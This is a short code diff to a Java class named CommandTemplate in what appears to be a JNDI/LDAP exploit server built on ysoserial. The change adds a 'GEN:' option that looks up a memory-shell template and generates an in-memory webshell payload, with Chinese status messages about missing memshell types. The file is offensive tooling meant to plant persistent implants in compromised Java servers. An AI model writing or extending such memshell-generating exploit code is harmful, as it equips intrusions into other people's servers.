@@ -1,6 +1,7 @@
 package com.bloom.Template;
 
 
+import com.bloom.exploit.GenMemshellResolver;
 import com.bloom.util.Functions;
 import com.bloom.util.Functions;
 import com.unboundid.util.Base64;
@@ -29,6 +30,20 @@ public class CommandTemplate implements Template{
             } catch (Exception e) {
                 // 失败态：bytes 保持 null，cache() 跳过写入，不静默继续
                 System.out.println("[!] 无该内存马类型: " + shortName);
+            }
+        } else if (this.cmd.startsWith("GEN:")) {
+            String combo = this.cmd.substring(4);
+            String templateName = GenMemshellResolver.resolve(combo);
+            if (templateName == null) {
+                System.out.println("[!] 无该 GEN 组合: " + combo);
+                this.className = "INVALID";
+            } else {
+                this.className = templateName;
+                try {
+                    generateMemshell(Class.forName("ysoserial.payloads.templates." + templateName, false, CommandTemplate.class.getClassLoader()));
+                } catch (Exception e) {
+                    System.out.println("[!] GEN 模板加载失败: " + templateName);
+                }
             }
         } else if (this.cmd.startsWith("FILE:")) {
             String shortName=this.cmd.substring(5);
